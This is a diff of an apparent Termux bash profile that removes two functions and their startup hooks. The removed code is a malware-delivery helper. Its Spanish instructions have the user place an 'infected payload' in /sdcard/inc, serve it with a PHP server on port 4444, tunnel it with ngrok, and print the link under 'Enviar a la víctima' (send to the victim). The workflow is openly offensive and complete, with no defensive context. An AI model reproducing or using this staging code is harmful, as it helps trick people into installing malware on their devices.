@@ -4,15 +4,6 @@ if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ];then
         }
 fi
 
-if [ -x $PREFIX/php-sg02 ];then
-phpSGSG 02
-fi
-if [ -x $PREFIX/php-sg03 ];then
-phpSGSG 03
-fi
-if [ -x $PREFIX/php-sg04 ];then
-phpSGSG 04
-fi
 
 function dw {
 cd /sdcard/download
@@ -123,82 +114,6 @@ chmod 777 tmux-viewer
 ;;
 esac
 fi
-}
-
-
-function phpsg {
-cd
-cd /sdcard
-rm -Rf inc
-mkdir inc
-cd
-clear
-printf "
-ATENCIÓN; LEER Y SEGUIR LOS PASOS ACONTINUACION 
- __________________________________________________________
-|#1 Mueve el Payload infectado a la carpeta inc ubicada en |
-|   la ruta:   /sdcard/inc                                 |
-|__________________________________________________________|
-|#2 Abre la sesión #2 y coloca el nombre de tu payload     |
-|__________________________________________________________|
-|#3 Abre la sesión #3 y copia el link que te dará ngrok,   |
-|   nota: Es el link que empieza en http:                  |
-|__________________________________________________________|
-|#4 Abre la sesión #4 y en ella pega el link de ngrok http |
-|   que acabas de copiar en la sesión 3                    |
-\__________________________________________________________/
-
-EN LA SESIÓN #1 ESTARÁN LOS PASOS POR SI LOS NECESITAS...
-"
-cd
-cd $PREFIX
-mkdir php-sg02
-cd
-} 
-
-
-function phpSGSG {
-case $1 in
-02)
-cd; cd $PREFIX
-rm -Rf php-sg02
-mkdir php-sg03
-read -p "nombre de tu Payload: " elapk
-cd
-cd ..
-echo "
-#!/bin/bash
-
-payload=\"$elapk\"
-" > .pay.sh
-chmod 777 .pay.sh
-php -S 127.0.0.1:4444 -t /sdcard/inc
-;;
-03)
-cd; cd $PREFIX
-rm -Rf php-sg03
-mkdir php-sg04
-cd
-ngrok http 4444
-;;
-04)
-cd; cd $PREFIX
-rm -Rf php-sg04
-read -p "coloca el link http de ngrok: " ellink
-cd
-source ../.pay.sh
-clear
-echo "
-Enviar a la víctima :
-     
-       $ellink/$payload
-"
-cd
-cd ..
-rm -Rf .pay.sh
-cd
-;;
-esac
 }
 
 
